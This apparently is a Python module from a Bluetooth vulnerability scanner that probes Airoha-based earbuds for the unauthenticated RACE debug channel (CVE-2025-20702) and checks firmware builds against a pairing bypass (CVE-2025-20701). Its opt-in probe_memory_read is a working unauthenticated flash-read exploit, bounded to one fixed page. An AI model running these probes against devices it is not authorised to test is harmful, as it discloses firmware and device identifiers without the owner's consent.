"""RACE protocol probes: reachability (CVE-2025-20702) and passive firmware
version check for pairing-bypass assessment (CVE-2025-20701).

RACE (the Airoha SDK's debug/configuration protocol) is what actually lets an
attacker read/write device RAM and flash once reachable. The reachability
probe below answers one question only: does the RACE command channel accept
an unauthenticated command and respond, without pairing. It never issues a
memory read/write command (RACE_STORAGE_PAGE_READ/PROGRAM, GET_LINK_KEY, or
any FOTA command) - those are the attack itself and stay out of scope.

Instead it sends GetSDKInfo (RaceId.RACE_READ_SDK_VERSION), a protocol
handshake query with no RAM/flash payload, and checks only whether a valid
RACE response frame comes back - not what it contains.

The firmware check sends BuildVersion (RaceId.RACE_GET_BUILD_VERSION) and
decodes the returned build string to cross-reference against a known-patched
build in data/affected_devices.json. ERNW's own toolkit (race_toolkit.py)
only ever compares buildversion strings by exact equality against a small
hardcoded allow-list - real buildversion responses are opaque vendor build
identifiers (e.g. "mt2822x_evkMT2822_SDK_Sony-ER69_mdr14_c42sp_1" + a build
date), not semver, so there is no sound "predates fix" ordering to compute.
This module follows the same exact-match approach rather than guessing a
version-comparison scheme the protocol doesn't actually support.

GATT service/characteristic UUIDs and the RACE packet header layout below are
taken directly from the ERNW race-toolkit reference implementation
(librace/constants.py and librace/packets.py) - not guessed. The buildversion
payload offset (6-byte header + 1-byte return code before the string) comes
from race_toolkit.py's own response handling (`res[7:].decode("utf8")`).

As in core/gatt.py, bonding state is verified independently via
`bluetoothctl info <addr>` rather than trusted from bleak's own state, since
a peripheral could in principle request pairing mid-operation and have
BlueZ's default agent silently complete it.

A RACE service can be discoverable and accept a write cleanly (no
authentication/encryption error from BlueZ) and still never send a response -
that is deliberately reported as "no response," not folded into "not
vulnerable." Confirmed live against a real Sony WF-1000XM3: the write
succeeded and no error was raised, but nothing came back. Two, and only two,
things are allowed to produce that result before it's trusted: the response
timeout genuinely elapsing (RESPONSE_TIMEOUT, matched to race-toolkit's own
patience for the same kind of round trip) and every write type the tx
characteristic declares support for having been tried. A BleakError or
operation-level timeout from the underlying GATT calls is a failed probe, not
a "no response" finding, and propagates as RaceProbeError instead - see
_send_race_command.

Cross-checked directly against race-toolkit's own source (not assumed): its
`RACE.setup()` performs no protocol-level handshake beyond the transport
connecting and subscribing to notifications, so there is no missing "session
open" command here. Its own `check` subcommand, however, does not use
GetSDKInfo at all for its BLE finding - it uses Bumble's raw-HCI transport
(not bleak/BlueZ) and an actual flash-read command, and its own comments
acknowledge a timeout there is treated as "device might be fixed," not
certain. That is a genuine methodology difference from this module (which
deliberately never issues a memory read/write command), not evidence that
either approach is wrong.
"""

from __future__ import annotations

import asyncio
import struct
from contextlib import asynccontextmanager

from bleak import BleakClient
from bleak.exc import BleakError

from core.gatt import is_paired
from core.models import RuleFlag

CONNECT_TIMEOUT = 10.0
# ERNW's own race-toolkit waits up to 8 seconds for a single RACE
# command/response round trip (its GetEDRAddress call, the closest analog to
# GetSDKInfo here) before giving up - matched here so a timeout means "the
# device didn't reply in a generous window," not "we didn't wait long enough."
RESPONSE_TIMEOUT = 8.0
CHAR_OPERATION_TIMEOUT = 5.0

# Known RACE GATT UUIDs, from ERNW race-toolkit librace/constants.py:UuidTable.
RACE_SERVICES = {
    "Airoha": {
        "service": "5052494d-2dab-0341-6972-6f6861424c45",
        "tx": "43484152-2dab-3241-6972-6f6861424c45",
        "rx": "43484152-2dab-3141-6972-6f6861424c45",
    },
    "Sony": {
        "service": "dc405470-a351-4a59-97d8-2e2e3b207fbb",
        "tx": "bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead",
        "rx": "2a6b6575-faf6-418c-923f-ccd63a56d955",
    },
}

# RACE packet header, from librace/packets.py:RaceHeader ("<BBHH" = head, type, length, cmd id).
RACE_HEADER_FORMAT = "<BBHH"
RACE_HEADER_SIZE = struct.calcsize(RACE_HEADER_FORMAT)
# Response payload is prefixed with a 1-byte return code before any string content.
RACE_RESPONSE_PREAMBLE_SIZE = 1

RACE_TYPE_CMD_EXPECTS_RESPONSE = 0x5A
RACE_TYPE_RESPONSE = 0x5B
RACE_ID_READ_SDK_VERSION = 0x0301
RACE_ID_GET_BUILD_VERSION = 0x1E08

# RACE_STORAGE_PAGE_READ, from librace/constants.py:RaceId - used only by the
# opt-in probe_memory_read (see its docstring for why this stays separate
# from the reachability-only probe_race above). FLASH_READ_TEST_ADDRESS is
# the same address ERNW's own race-toolkit reads in its `check` command
# (command_check in race_toolkit.py) - a fixed, known-safe offset into the
# SoC's mapped internal flash, not a user-configurable address. Flash is
# non-volatile storage: reads have no wear cost and no side effects, unlike
# RAM/registers on some architectures (memory-mapped I/O can have read side
# effects) - that's why this reads flash and never exposes RACE_READ_ADDRESS.
RACE_ID_STORAGE_PAGE_READ = 0x403
FLASH_READ_TEST_ADDRESS = 0x08000000
FLASH_READ_PAGE_SIZE = 0x100
# From librace/packets.py:ReadFlashPageResponse - return_code (1) + storage_type
# (1) + reserved (1) + reserved (1) + read_address (4), before the page data.
FLASH_READ_PREAMBLE_FORMAT = "<BBBBI"
FLASH_READ_PREAMBLE_SIZE = struct.calcsize(FLASH_READ_PREAMBLE_FORMAT)

# RACE_GET_BD_ADDRESS ("GetEDRAddress" in race-toolkit's own naming), from
# librace/constants.py:RaceId - queries the device's Bluetooth Classic
# (BR/EDR) address over the same unauthenticated RACE channel used above.
# Same risk shape as RACE_ID_READ_SDK_VERSION/RACE_ID_GET_BUILD_VERSION: a
# zero-payload metadata query, not the flash-read path, so it doesn't need
# probe_memory_read's separate confirmation gate. Response layout from
# librace/packets.py:GetEDRAddressResponse - return_code (1 byte) + reserved
# (1 byte), then a 6-byte BD_ADDR that race-toolkit's own unpack() reverses
# before use (the wire order is reversed relative to standard BD_ADDR
# notation).
RACE_ID_GET_BD_ADDRESS = 0xCD5
BD_ADDRESS_PREAMBLE_FORMAT = "<BB"
BD_ADDRESS_PREAMBLE_SIZE = struct.calcsize(BD_ADDRESS_PREAMBLE_FORMAT)
BD_ADDRESS_LENGTH = 6


class RaceProbeError(Exception):
    """Raised when the probe could not run or its result can't be trusted."""


def _build_race_command(cmd_id: int) -> bytes:
    # Mirrors librace.packets classes like GetSDKInfo/BuildVersion: head=0x05,
    # empty payload. RacePacket.pack() sets header.length = len(payload) + 2
    # (the cmd-id field).
    return struct.pack(
        RACE_HEADER_FORMAT, 0x05, RACE_TYPE_CMD_EXPECTS_RESPONSE, 2, cmd_id
    )


def _frame_type(frame: bytes) -> int | None:
    if len(frame) < RACE_HEADER_SIZE:
        return None
    return struct.unpack(RACE_HEADER_FORMAT, frame[:RACE_HEADER_SIZE])[1]


def _build_flash_read_command(address: int, storage_type: int = 0) -> bytes:
    # Mirrors librace.packets.ReadFlashPage: payload is storage_type (1
    # byte) + (page size >> 8) (1 byte) + address (4-byte little-endian).
    payload = bytes([storage_type, FLASH_READ_PAGE_SIZE >> 8]) + struct.pack(
        "<I", address
    )
    header = struct.pack(
        RACE_HEADER_FORMAT,
        0x05,
        RACE_TYPE_CMD_EXPECTS_RESPONSE,
        len(payload) + 2,
        RACE_ID_STORAGE_PAGE_READ,
    )
    return header + payload


def _parse_flash_read_response(frame: bytes) -> tuple[int, bytes] | None:
    """Return (return_code, page_data) for a well-formed flash-read response
    frame, or None if the frame isn't one - a different RACE response (e.g.
    an INDICATION, or a response to some other in-flight command) must not
    be misread as flash data."""
    if _frame_type(frame) != RACE_TYPE_RESPONSE:
        return None
    if len(frame) < RACE_HEADER_SIZE:
        return None
    cmd_id = struct.unpack(RACE_HEADER_FORMAT, frame[:RACE_HEADER_SIZE])[3]
    if cmd_id != RACE_ID_STORAGE_PAGE_READ:
        return None

    payload = frame[RACE_HEADER_SIZE:]
    if len(payload) < FLASH_READ_PREAMBLE_SIZE:
        return None

    return_code = payload[0]
    page_data = payload[FLASH_READ_PREAMBLE_SIZE:]
    return return_code, page_data


def _parse_bd_address_response(frame: bytes) -> tuple[int, str | None] | None:
    """Return (return_code, bd_address) for a well-formed GetEDRAddress
    response frame, or None if the frame isn't one. bd_address is a
    colon-separated hex string (e.g. "AA:BB:CC:DD:EE:FF"), or None if a
    return code came back but the address bytes were short/malformed."""
    if _frame_type(frame) != RACE_TYPE_RESPONSE:
        return None
    if len(frame) < RACE_HEADER_SIZE:
        return None
    cmd_id = struct.unpack(RACE_HEADER_FORMAT, frame[:RACE_HEADER_SIZE])[3]
    if cmd_id != RACE_ID_GET_BD_ADDRESS:
        return None

    payload = frame[RACE_HEADER_SIZE:]
    if len(payload) < BD_ADDRESS_PREAMBLE_SIZE:
        return None

    return_code = payload[0]
    addr_bytes = payload[BD_ADDRESS_PREAMBLE_SIZE:]
    if len(addr_bytes) < BD_ADDRESS_LENGTH:
        return return_code, None

    bd_address = ":".join(f"{b:02X}" for b in reversed(addr_bytes[:BD_ADDRESS_LENGTH]))
    return return_code, bd_address


def _decode_build_version(frame: bytes) -> str:
    payload_start = RACE_HEADER_SIZE + RACE_RESPONSE_PREAMBLE_SIZE
    return frame[payload_start:].rstrip(b"\x00").decode("utf-8", errors="replace")


def _find_race_service(client: BleakClient) -> tuple[str, dict[str, str]] | None:
    service_uuids = {service.uuid.lower() for service in client.services}
    for vendor, uuids in RACE_SERVICES.items():
        if uuids["service"] in service_uuids:
            return vendor, uuids
    return None


def _find_characteristic(client: BleakClient, char_uuid: str):
    for service in client.services:
        for char in service.characteristics:
            if char.uuid.lower() == char_uuid.lower():
                return char
    return None


def _write_attempts_for(properties: list[str] | None) -> list[bool]:
    """Decide which GATT write type(s) to try, in order, for the tx
    characteristic. Forcing a write type the firmware doesn't listen on
    would look identical to "device stayed silent" otherwise - race-toolkit's
    own bleak transport (GATTBleakTransport.send) sidesteps this by leaving
    the choice to bleak's own default rather than forcing one; this tries
    both declared types in turn when both are advertised, so a "no response"
    result can't be blamed on having picked the wrong one."""
    if not properties:
        return [True]

    supports_with_response = "write" in properties
    supports_without_response = "write-without-response" in properties

    if supports_with_response and supports_without_response:
        return [True, False]
    if supports_without_response and not supports_with_response:
        return [False]
    return [True]


async def _send_race_command(
    client: BleakClient, uuids: dict[str, str], command: bytes
) -> bytes | None:
    """Write a RACE command frame and return the full, reassembled response
    frame, or None once every write type the tx characteristic declares
    support for has been tried and cleanly delivered with no reply.

    A RACE response larger than the negotiated ATT MTU allows in one Handle
    Value Notification arrives as multiple fragments - confirmed live: a
    270-byte flash-page-read response over a 242-byte negotiated MTU arrived
    as two. The first fragment's header gives the full logical frame size
    (header.length + 4 bytes - RaceHeader's own length field counts the
    cmd-id field twice by convention, matching race-toolkit's own
    RACE._recv reassembly in librace/race.py), so notifications are
    accumulated until that many bytes have arrived rather than treating the
    first fragment as if it were the whole response - which would silently
    truncate any response bigger than one MTU.

    A BleakError or operation-level timeout from start_notify/write_gatt_char/
    stop_notify propagates instead of collapsing into None - that's a failed
    probe, a materially different (and untrustworthy) result from a clean
    write met with silence. Callers already treat a BleakError from this
    whole block as reason to raise RaceProbeError rather than report a
    finding; asyncio.TimeoutError from these same bounded calls needs the
    same treatment (see probe_race/probe_firmware_version).

    A response-wait timeout is handled two different ways depending on
    whether anything arrived at all. Confirmed live: a flash-page-read the
    device explicitly declined got its first (233-byte) fragment reliably,
    every time, with both write types - but never a second, even after the
    full RESPONSE_TIMEOUT, both times. That first fragment already carries
    the complete, decisive return code - discarding it because the
    declared-but-never-sent remainder didn't arrive would throw away a real
    answer for no reason. So: if the response timeout elapses with *some*
    bytes already buffered, that partial frame is returned as-is (callers
    already validate frame shape/length before trusting anything in it). If
    *nothing* arrived at all, that's treated as this write type genuinely
    getting no engagement, and the next write type is tried; None is
    returned only once every write type has been tried and gotten nothing.
    """
    tx_char = _find_characteristic(client, uuids["tx"])
    write_attempts = _write_attempts_for(
        list(tx_char.properties) if tx_char is not None else None
    )

    response = asyncio.Event()
    buffer = bytearray()
    expected_total_size: int | None = None

    def _on_notify(_sender, data: bytearray) -> None:
        nonlocal expected_total_size
        buffer.extend(data)
        if expected_total_size is None and len(buffer) >= RACE_HEADER_SIZE:
            length = struct.unpack(
                RACE_HEADER_FORMAT, bytes(buffer[:RACE_HEADER_SIZE])
            )[2]
            expected_total_size = length + 4
        if expected_total_size is not None and len(buffer) >= expected_total_size:
            response.set()

    # start_notify/write_gatt_char/stop_notify have no bound of their own: a
    # device that silently drops a request instead of returning an ATT error
    # can hang these indefinitely (observed live in core/gatt.py against a
    # real device - same underlying bleak/BlueZ behavior applies here).
    await asyncio.wait_for(
        client.start_notify(uuids["rx"], _on_notify), timeout=CHAR_OPERATION_TIMEOUT
    )
    try:
        for write_response in write_attempts:
            response.clear()
            buffer.clear()
            expected_total_size = None
            await asyncio.wait_for(
                client.write_gatt_char(uuids["tx"], command, response=write_response),
                timeout=CHAR_OPERATION_TIMEOUT,
            )
            try:
                await asyncio.wait_for(response.wait(), timeout=RESPONSE_TIMEOUT)
            except TimeoutError:
                if not buffer:
                    continue
            return bytes(buffer)
    finally:
        await asyncio.wait_for(
            client.stop_notify(uuids["rx"]), timeout=CHAR_OPERATION_TIMEOUT
        )

    return None


@asynccontextmanager
async def _race_connection(address: str, timeout: float):
    """BleakClient connection with one retry on a transient BlueZ
    device-vanish - same fix and rationale as core/gatt.py's
    _unpaired_connection: an unpaired ("temporary") device's BlueZ D-Bus
    record can be dropped between probes if it goes idle/stops advertising
    in that window - confirmed live during --assess, which runs several
    independent connect/disconnect cycles back-to-back against the same
    address (bleak surfaces this as a bare BleakError from its own
    device-cache check, e.g. "device '<path>' not found", not a real
    unreachability finding). A fresh scan-and-connect attempt immediately
    after often succeeds, so only the connect step itself is retried - a
    failure during the probe body below propagates as-is rather than being
    silently retried."""
    client = BleakClient(address, timeout=timeout)
    try:
        await client.connect()
    except (BleakError, TimeoutError):
        await client.connect()
    try:
        yield client
    finally:
        if client.is_connected:
            await client.disconnect()


def _evaluate_pairing_bypass(
    matched_profile: dict | None, version: str | None
) -> list[RuleFlag]:
    if matched_profile is None:
        return []

    patched_firmware = matched_profile.get("patched_firmware")
    label = f"{matched_profile.get('brand')} {matched_profile.get('model')}"

    if version is None:
        return [
            RuleFlag(
                flag_id="CLASSIC_PAIRING_BYPASS_UNKNOWN",
                severity="MEDIUM",
                description=(
                    f"{label} is a known-affected model but its firmware "
                    "build version could not be retrieved via RACE"
                ),
                cve="CVE-2025-20701",
                evidence={"patched_firmware": patched_firmware},
            )
        ]

    if patched_firmware is not None and version == patched_firmware:
        return []

    return [
        RuleFlag(
            flag_id="CLASSIC_PAIRING_BYPASS_UNPATCHED",
            severity="HIGH",
            description=(
                f"{label} firmware build `{version}` does not match the "
                f"known-patched build `{patched_firmware}`"
                if patched_firmware
                else f"{label} firmware build `{version}` - no patch has been released"
            ),
            cve="CVE-2025-20701",
            evidence={
                "firmware_version": version,
                "patched_firmware": patched_firmware,
            },
        )
    ]


async def probe_race(
    address: str, timeout: float = CONNECT_TIMEOUT
) -> tuple[bool, list[RuleFlag]]:
    """Return (service_found, flags). A known RACE service can be present but
    not respond to an unauthenticated command - that's a materially
    different result from no RACE service existing at all, so callers get
    both rather than having "no response" collapse into "not present"."""
    if await is_paired(address):
        raise RaceProbeError(
            f"{address} is already paired; a RACE-reachability finding "
            "would be meaningless against an already-bonded device"
        )

    flags: list[RuleFlag] = []
    service_found = False

    try:
        async with _race_connection(address, timeout) as client:
            match = _find_race_service(client)
            if match is None:
                return service_found, flags

            service_found = True
            vendor, uuids = match
            frame = await _send_race_command(
                client, uuids, _build_race_command(RACE_ID_READ_SDK_VERSION)
            )
    except (BleakError, TimeoutError) as exc:
        raise RaceProbeError(
            f"could not complete RACE probe against {address}: {exc}"
        ) from exc

    if await is_paired(address):
        raise RaceProbeError(
            f"{address} became paired during the probe; discarding results as untrustworthy"
        )

    if frame is not None and _frame_type(frame) == RACE_TYPE_RESPONSE:
        flags.append(
            RuleFlag(
                flag_id="RACE_EXPOSED",
                severity="HIGH",
                description=(
                    f"RACE command channel ({vendor} GATT UUIDs) accepted an "
                    "unpaired command and returned a valid response"
                ),
                cve="CVE-2025-20702",
                evidence={
                    "vendor": vendor,
                    "service_uuid": uuids["service"],
                    "tx_characteristic": uuids["tx"],
                    "rx_characteristic": uuids["rx"],
                },
            )
        )

    return service_found, flags


async def probe_firmware_version(
    address: str, matched_profile: dict | None, timeout: float = CONNECT_TIMEOUT
) -> tuple[str | None, list[RuleFlag]]:
    if await is_paired(address):
        raise RaceProbeError(
            f"{address} is already paired; a firmware-version finding "
            "would be meaningless against an already-bonded device"
        )

    version: str | None = None

    try:
        async with _race_connection(address, timeout) as client:
            match = _find_race_service(client)
            if match is not None:
                _vendor, uuids = match
                frame = await _send_race_command(
                    client, uuids, _build_race_command(RACE_ID_GET_BUILD_VERSION)
                )
                if frame is not None and _frame_type(frame) == RACE_TYPE_RESPONSE:
                    version = _decode_build_version(frame)
    except (BleakError, TimeoutError) as exc:
        raise RaceProbeError(
            f"could not complete firmware check against {address}: {exc}"
        ) from exc

    if await is_paired(address):
        raise RaceProbeError(
            f"{address} became paired during the probe; discarding results as untrustworthy"
        )

    return version, _evaluate_pairing_bypass(matched_profile, version)


async def probe_bd_address(
    address: str, timeout: float = CONNECT_TIMEOUT
) -> tuple[bool, str | None, str | None]:
    """Query the device's Bluetooth Classic (BR/EDR) address via RACE
    (GetEDRAddress/RACE_ID_GET_BD_ADDRESS) - a zero-payload metadata query,
    the same risk shape as GetSDKInfo/BuildVersion above, not the flash-read
    path, so no separate confirmation gate is needed beyond the standard
    ownership prompt.

    Useful on its own: this tool has no Bluetooth Classic transport (see
    ROADMAP.md's Hardware requirement note), so a user who wants to pursue
    CVE-2025-20701 active testing with their own Classic-capable radio/
    tooling needs the device's real Classic address first, which can differ
    from the BLE address this tool already has.

    Returns (service_found, bd_address, note), following probe_memory_read's
    shape - note explains why no address was retrieved when one wasn't. This
    raises no RuleFlag of its own: like the firmware buildversion check, a
    successful query is a data point that feeds further assessment, not a
    vulnerability finding in itself (RACE_EXPOSED already covers "the
    channel accepted an unauthenticated command").
    """
    if await is_paired(address):
        raise RaceProbeError(
            f"{address} is already paired; a BD-address query would be "
            "meaningless against an already-bonded device"
        )

    bd_address: str | None = None
    service_found = False

    try:
        async with _race_connection(address, timeout) as client:
            match = _find_race_service(client)
            if match is None:
                return service_found, bd_address, None

            service_found = True
            _vendor, uuids = match
            frame = await _send_race_command(
                client, uuids, _build_race_command(RACE_ID_GET_BD_ADDRESS)
            )
    except (BleakError, TimeoutError) as exc:
        raise RaceProbeError(
            f"could not complete BD-address query against {address}: {exc}"
        ) from exc

    if await is_paired(address):
        raise RaceProbeError(
            f"{address} became paired during the probe; discarding results as untrustworthy"
        )

    note: str | None = None

    if frame is None:
        note = "device did not respond to the BD-address query"
    else:
        parsed = _parse_bd_address_response(frame)
        if parsed is None:
            note = (
                f"received a {len(frame)}-byte response that wasn't a "
                "well-formed BD-address reply"
            )
        else:
            return_code, address_value = parsed
            if return_code == 0 and address_value is not None:
                bd_address = address_value
            else:
                note = (
                    f"device declined or returned a malformed BD address "
                    f"(return code {return_code})"
                )

    return service_found, bd_address, note


async def probe_memory_read(
    address: str, timeout: float = CONNECT_TIMEOUT
) -> tuple[bool, list[RuleFlag], str | None]:
    """Opt-in, definitive confirmation of CVE-2025-20702: attempts one real
    RACE flash-page read (RACE_STORAGE_PAGE_READ) at the fixed address
    FLASH_READ_TEST_ADDRESS and checks whether real flash content comes
    back. This is deliberately separate from probe_race, which only tests
    reachability (GetSDKInfo, no RAM/flash payload) and never crosses into
    actual memory disclosure - a caller must opt into this one explicitly,
    since a success here means real device firmware bytes were retrieved,
    not just "the channel is unauthenticated."

    Bounded and read-only by design, not a general dumping capability: one
    fixed page (FLASH_READ_PAGE_SIZE bytes) at one fixed address, no
    caller-supplied address/size, no looping across a range, no RAM/register
    reads (RACE_READ_ADDRESS is never used - unlike flash, some
    architectures alias RAM addresses to memory-mapped I/O with read side
    effects), and never Program/Erase/FOTA/GetLinkKey. This is the same
    address ERNW's own race-toolkit reads for its equivalent BLE check.

    Returns (service_found, flags, note). note is a human-readable reason no
    flag was raised - distinct outcomes (device explicitly declined with a
    given return code vs. a response that didn't look like a flash-read
    reply at all) would otherwise both print as the same generic "nothing
    happened," which isn't true and isn't useful. note is always None when a
    flag was raised.
    """
    if await is_paired(address):
        raise RaceProbeError(
            f"{address} is already paired; a memory-read finding would be "
            "meaningless against an already-bonded device"
        )

    flags: list[RuleFlag] = []
    service_found = False

    try:
        async with _race_connection(address, timeout) as client:
            match = _find_race_service(client)
            if match is None:
                return service_found, flags, None

            service_found = True
            vendor, uuids = match
            frame = await _send_race_command(
                client, uuids, _build_flash_read_command(FLASH_READ_TEST_ADDRESS)
            )
    except (BleakError, TimeoutError) as exc:
        raise RaceProbeError(
            f"could not complete memory-read probe against {address}: {exc}"
        ) from exc

    if await is_paired(address):
        raise RaceProbeError(
            f"{address} became paired during the probe; discarding results as untrustworthy"
        )

    note: str | None = None

    if frame is None:
        note = "device did not respond to the flash-read command"
    else:
        parsed = _parse_flash_read_response(frame)
        if parsed is None:
            note = (
                f"received a {len(frame)}-byte response that wasn't a "
                "well-formed flash-read reply"
            )
        else:
            return_code, page_data = parsed
            if return_code == 0 and page_data:
                flags.append(
                    RuleFlag(
                        flag_id="RACE_MEMORY_READ_CONFIRMED",
                        severity="HIGH",
                        description=(
                            f"RACE command channel ({vendor} GATT UUIDs) returned "
                            f"{len(page_data)} bytes of real flash content from "
                            f"{FLASH_READ_TEST_ADDRESS:#010x} without pairing"
                        ),
                        cve="CVE-2025-20702",
                        evidence={
                            "vendor": vendor,
                            "service_uuid": uuids["service"],
                            "address": f"{FLASH_READ_TEST_ADDRESS:#010x}",
                            "bytes_returned": len(page_data),
                            "sample_hex": page_data[:16].hex(),
                        },
                    )
                )
                note = None
            else:
                note = (
                    f"device explicitly declined the read (return code "
                    f"{return_code}) rather than staying silent or returning "
                    "data"
                )

    return service_found, flags, note
